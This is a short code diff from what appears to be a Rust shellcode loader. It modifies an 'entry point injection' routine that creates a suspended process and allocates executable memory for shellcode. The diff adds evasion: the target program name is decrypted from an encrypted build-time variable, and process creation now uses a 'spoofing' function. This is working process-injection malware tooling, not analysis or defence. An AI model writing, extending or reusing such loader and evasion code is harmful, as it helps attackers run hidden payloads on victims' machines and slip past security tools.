@@ -2,12 +2,15 @@ use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED};
 use crate::api::{PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
 
 #[cfg(feature = "run_entry_point_injection")]
-pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &str) -> Result<(), String> {
+pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), String> {
     #[cfg(feature = "debug")]
     crate::utils::print_message("Executing via Entry Point Injection...");
    
+    use crate::utils::simple_decrypt;
+    let target_program = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PROGRAM"));
+
     // 1. Create Process in Suspended State
-    let process_info = crate::utils::remote::create_process(target_program, CREATE_SUSPENDED)?;
+    let process_info = crate::api::create_process_with_spoofing(target_program.as_str(), true)?;
 
     // 2. Allocate Memory for Shellcode
     let remote_mem = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, shellcode_len, PAGE_EXECUTE_READWRITE)?;
